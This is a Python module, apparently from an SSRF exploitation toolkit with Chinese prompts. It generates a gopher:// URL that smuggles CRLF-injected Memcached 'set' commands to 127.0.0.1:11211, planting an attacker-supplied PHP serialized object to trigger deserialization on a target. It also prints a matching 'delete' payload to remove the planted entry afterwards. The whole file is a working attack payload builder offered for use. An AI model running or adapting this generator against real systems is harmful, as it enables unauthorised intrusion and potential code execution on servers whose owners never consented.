import urllib
import urllib.parse
from .colors import c, DIM, BOLD, CYAN, YELLOW, GREEN, RED, UNDERLINE, BRIGHT_CYAN, BRIGHT_GREEN, BRIGHT_YELLOW, print_banner, print_step, print_info, print_success, print_warning


def PHPMemcached():
    print_banner("PHP Memcached 反序列化利用")

    print_step(1, "配置序列化 Payload")
    print_info("输入 PHP 序列化后的 payload")
    print_warning("需要你预先知道目标使用的类和变量名")
    print_warning("示例: O:5:\"Hello\":0:{} 或 自定义反序列化链")
    code = input(c("  > 序列化 payload: ", CYAN))
    while not code:
        print(c("  [x] payload 不能为空", RED))
        code = input(c("  > 序列化 payload: ", CYAN))

    payload = f"%0d%0aset SpyD3r 4 0 {len(code)}%0d%0a{code}%0d%0a"

    finalpayload = (
        urllib.parse.quote_plus(payload)
        .replace("+", "%20")
        .replace("%2F", "/")
        .replace("%25", "%")
        .replace("%3A", ":")
    )

    print_banner("利用链接已生成")
    print("")
    print(c("  将以下 URL 编码到 SSRF 漏洞中:", CYAN))
    print("")
    print(c("  " + "-" * 48, DIM))
    print(c(f"gopher://127.0.0.1:11211/_{finalpayload}", UNDERLINE + YELLOW))
    print(c("  " + "-" * 48, DIM))
    print("")
    print_success("Payload 已生成，将写入 Memcached")
    print("")
    print(c("  完成后可使用以下 payload 删除 memcached 项目:", CYAN))
    print(c("gopher://127.0.0.1:11211/_%0d%0adelete%20SpyD3r%0d%0a", UNDERLINE + YELLOW))

    print("\n" + c("  " + "=" * 48, BRIGHT_CYAN))
    print(c("  原作者: $_SpyD3r_$", BRIGHT_CYAN))
    print(c("  修改者: @_mingy_@", BRIGHT_CYAN))
    print(c("  " + "=" * 48, BRIGHT_CYAN))
